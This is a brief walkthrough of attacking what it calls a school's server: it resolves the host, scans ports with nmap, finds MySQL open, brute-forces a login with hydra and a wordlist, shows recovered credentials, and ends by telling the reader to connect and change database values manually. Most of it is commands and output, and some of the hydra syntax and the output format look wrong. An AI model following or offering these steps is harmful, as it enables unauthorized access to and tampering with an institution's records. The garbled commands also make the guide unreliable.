`nslookup new-request.name`

to find the ip adress of the school.

`nmap 56.44.12.45 -sV`

to find the ports are open in the server.

PORT	STATE	SERVICE	VERSION	DESTINATION
21	CLOSE	ftp	vsftpd 3.0.3	
80	CLOSE	http	nginx 1.25.5	
3306	OPEN	database	mysql 8.0.37	
8080	CLOSE	http-proxy	nginx 1.25.5

database is open. we will use hydra to trying to find a user to login.

`apt-get install hydra`

after it. you can force using a `wordlist.lst` in hackdb.

the example is `hydra -T IP:PORT -P destination/to/wordlist.lst`

the command is `hydra -T 56.44.12.45:3306 -P /home/Yagasaki/downloads/wordlist.lst`

the return is.
+-------+----------+
| USER  | PASSWORD |
+-------+----------+
| guest | chessie  |
+-------+----------+

install database manager to access the database, change the value manually and disconnect.